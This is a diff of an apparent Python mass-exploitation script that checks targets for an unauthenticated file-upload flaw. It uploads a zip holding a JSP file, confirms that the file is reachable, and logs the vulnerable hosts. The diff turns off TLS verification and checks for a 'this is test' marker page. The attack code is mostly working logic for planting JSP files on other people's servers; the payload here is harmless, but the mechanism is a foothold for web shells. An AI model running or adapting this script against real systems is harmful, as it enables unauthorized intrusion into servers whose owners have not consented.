@@ -13,11 +13,12 @@ import gevent
 import gevent.pool
 import time
 
+#为提高扫描准确度，test设置为vuln标志
 shell=b'''
 <% out.print("this is test");%>
 '''
 
-proxy={'socks5':'socoks5://127.0.0.1:1080'}
+proxy={'http':''}
 
 dir_path = os.path.dirname(os.path.abspath(__file__))
 parser = argparse.ArgumentParser(description="请输入目标")
@@ -99,13 +100,13 @@ def fw_upload(host,randomname,randomfile):
         'filename':(randomfile+'.zip',open(dir_path+randomfile+".zip",'rb'),'application/octet-stream')
     }
     try:
-        retest =requests.get(url,headers=headers,timeout=5,proxies=proxy)
+        retest =requests.get(url,proxies=proxy,headers=headers,timeout=5,verify=False)
         if(retest.status_code ==200):
             print("[+]target maybe vuln-----------------------"+host)
-            re = requests.post(url,headers=headers,files=files,timeout=5,proxies=proxy)
+            re = requests.post(url,headers=headers,files=files,timeout=5,proxies=proxy,verify=False)
             url_check = host+"/"+randomname+'.jsp'
-            re_check = requests.get(url=url_check,headers=headers,proxies=proxy)
-            if(re_check.status_code == 200):
+            re_check = requests.get(url=url_check,headers=headers,proxies=proxy,verify=False)
+            if(re_check.status_code == 200)and 'test' in re_check.text:
                 print("[+]exploit success -----------------------"+url_check)
                 with open('vul.txt','a+',encoding="utf-8") as s:
                     s.write(url_check+'\n')
